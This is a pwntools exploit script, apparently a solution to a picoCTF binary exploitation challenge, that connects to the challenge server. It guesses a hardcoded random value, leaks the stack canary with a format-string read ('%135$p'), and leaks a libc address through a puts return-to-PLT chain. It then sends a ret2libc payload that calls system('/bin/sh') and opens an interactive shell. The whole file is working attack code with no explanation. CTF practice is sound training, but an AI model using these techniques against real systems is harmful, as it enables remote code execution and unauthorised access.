from pwn import *
from sys import argv

elf = context.binary = ELF("./vuln")
libc = ELF("./libc-2.27.so")

r = remote("shape-facility.picoctf.net",int(argv[1]))

"""
rand_offset = 0
for guess in range(-4096,4096+1):
    r.recvuntil(b"guess?\n")
    r.sendline(str(guess).encode())
    ans = r.recvline()
    if guess % 100 == 0:
        print(guess)
    if not b"Nope" in ans: 
        rand_offset = guess
        r.info(f"rand offset: {hex(rand_offset)}")
        break
"""

rand = -0xe8f
r.info(f"Correct number: {rand}")

# Leak stack cookie
r.sendline(str(rand).encode())
r.recvuntil(b"Name?")
r.sendline(b"%135$p")
r.recvuntil(b"Congrats: ")
canary = int(r.recvline().strip(),16)
r.info(f"Canary: {hex(canary)}")

# offsets
# __libc_start_main: eb0
# puts: 560

payload = b"A"*512 + p32(canary) + b"B"*12 
payload += p32(elf.plt.puts) + p32(elf.sym.main) + p32(elf.got.puts)
r.sendline(str(rand).encode())
r.sendline(payload)
r.recvuntil(b"AAA")
r.recvline();  r.recvline()

# Leak libc address
leak = u32(r.recv(4))
libc.address = leak - 0x67560
r.info(f"LIBC Address: {hex(libc.address)}")

system = libc.sym['system']
binsh = next(libc.search('/bin/sh\x00'))
pad = b"A"*512 + p32(canary) + b"B"*12 
payload = pad + p32(system) + p32(0) + p32(binsh)
r.sendline(str(rand).encode())
r.sendline(payload)

r.interactive()
